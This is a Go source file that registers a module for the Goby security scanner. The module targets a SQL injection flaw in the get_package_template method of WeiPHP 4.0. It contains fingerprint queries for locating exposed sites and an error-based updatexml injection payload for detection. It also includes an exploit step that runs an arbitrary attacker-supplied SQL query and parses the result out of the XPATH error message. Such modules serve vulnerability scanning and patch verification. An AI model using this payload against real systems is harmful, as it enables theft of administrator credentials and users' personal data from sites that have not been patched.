package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WeiPHP4.0 get_package_template method sql injection vulnerability",
    "Description": "<p>WeiPHP is a convenient, fast, and highly scalable open source WeChat public account platform development framework. With it, you can easily build your own WeChat public account platform.</p><p>The get_package_template method of WeiPHP 4.0 has a SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "WeiPHP",
    "Homepage": "https://www.weiphp.cn/",
    "DisclosureDate": "2022-07-31",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\"",
    "Level": "2",
    "is0day": false,
    "VulType": [
        "SQL Injection"
    ],
    "Impact": "<p>The get_package_template method of WeiPHP 4.0 has a SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://www.weiphp.cn/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?s=home/addons/get_package_template&addons[0]=BETWEEN%20%27a&addons[1][]=%20AND%20null%20or%20updatexml(1,concat(0x7e,md5(123)),1)%23&is_stree=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?s=home/addons/get_package_template&is_stree=1",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "addons[0]=BETWEEN 'a&addons[1][]= AND null or updatexml(1,concat(0x7e,({{{sql}}})),1)%23"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '~(.*)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\"",
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "Is0day": false,
    "Translation": {
        "CN": {
            "Name": "WeiPHP4.0的get_package_template方法SQL注入漏洞",
            "Product": "WeiPHP",
            "Description": "<p>WeiPHP是<span style=\"color: rgb(62, 62, 62);\">深圳市圆梦云科技有限公司基于thinkphp框架</span>一款方便快捷，扩展性强的开源微信公众号平台开发框架，利用它您可以轻松搭建一个属于自己的微信公众号平台。</p><p>WeiPHP4.0版本的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">get_package_template</span>方法存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、厂商已修复此漏洞，<span style=\"font-size: 17.5px;\">&nbsp;</span>请升级至最新版</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">WeiPHP4.0版本的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">get_package_template</span></span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">方法存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WeiPHP4.0 get_package_template method sql injection vulnerability",
            "Product": "WeiPHP",
            "Description": "<p>WeiPHP is a convenient, fast, and highly scalable open source WeChat public account platform development framework. With it, you can easily build your own WeChat public account platform.</p><p>The&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">get_package_template</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"></span> method of WeiPHP 4.0 has a SQL injection vulnerability.&nbsp;In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>The&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">get_package_template</span>&nbsp;method of WeiPHP 4.0 has a SQL injection vulnerability.&nbsp;In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "CVSSScore": "8.0",
    "PocId": "10698"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
